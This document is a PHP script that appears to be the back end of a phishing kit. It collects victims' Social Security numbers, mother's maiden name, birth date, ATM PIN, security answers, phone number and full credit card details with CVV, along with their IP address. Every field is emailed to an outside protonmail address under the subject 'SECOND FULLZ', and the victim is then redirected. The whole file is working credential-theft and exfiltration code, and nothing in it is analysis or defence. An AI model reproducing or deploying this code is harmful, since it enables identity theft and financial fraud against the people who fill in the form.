<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "SCHOOL NAME: " .$_POST['df']."\n";
$message .= "CAR NAME: " .$_POST['11']."\n";
$message .= "MMN: " .$_POST['Mothers_name']."\n";
$message .= "SSN: " .$_POST['ssn1']."-";
$message .= $_POST['ssn2']."-";
$message .= $_POST['ssn3']."\n";
$message .= "DOB: " .$_POST['bday']."/";
$message .= $_POST['bmonth']."/";
$message .= $_POST['byear']."\n";
$message .= "Fathers Middles Name: " .$_POST['lg']."\n\n";
$message .= "ATM: " .$_POST['atn']."\n\n";
$message .= "Pets Name: " .$_POST['vf']."\n\n";
$message .= "Phone Number: " .$_POST['dd']."\n\n";
$message .= "Credit Card: " .$_POST['card_type']."\n";
$message .= "Credit Card Number: " .$_POST['credit_card_number']."\n";
$message .= "Credit Card Type: " .$_POST['sub_type']."\n";
$message .= "Expiration Date: " .$_POST['expiration_month']."/";
$message .= $_POST['expiration_year']."\n";
$message .= "CVV: " .$_POST['csv']."\n";
$message .= "IP: ".$ip."\n";
$message .= "--------Made by Flow------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "-------------------+ Created in 2019 [ Donflow ] +--------------------\n";
$recipient = "oztheplug@protonmail.com";
$subject = "SECOND FULLZ";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."SECOND";
$headers .= "Donflow-SECOND-Fullz";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: +_ss+=.htm");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        